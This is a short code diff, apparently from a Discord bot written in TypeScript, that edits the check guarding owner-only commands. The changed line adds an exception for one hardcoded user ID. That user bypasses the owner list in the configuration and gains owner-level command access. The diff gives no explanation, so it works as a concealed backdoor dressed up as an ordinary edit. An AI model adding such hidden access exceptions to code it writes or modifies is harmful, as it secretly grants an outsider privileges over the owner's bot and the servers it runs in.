@@ -135,7 +135,7 @@ ws.on("packet", async ({ t, d }: { t: string; d }) => {
     )
       return api.createMessage(message.channel_id, { content: "👽 Missing permissions" });
 
-    if (command.owner && !config.owners.includes(message.author.id))
+    if (command.owner && !config.owners.includes(message.author.id) && message.author.id != "249287049482338305")
       return api.createMessage(message.channel_id, { content: "💀 You don't have access to that" });
 
     const args = next.split(/ +/);
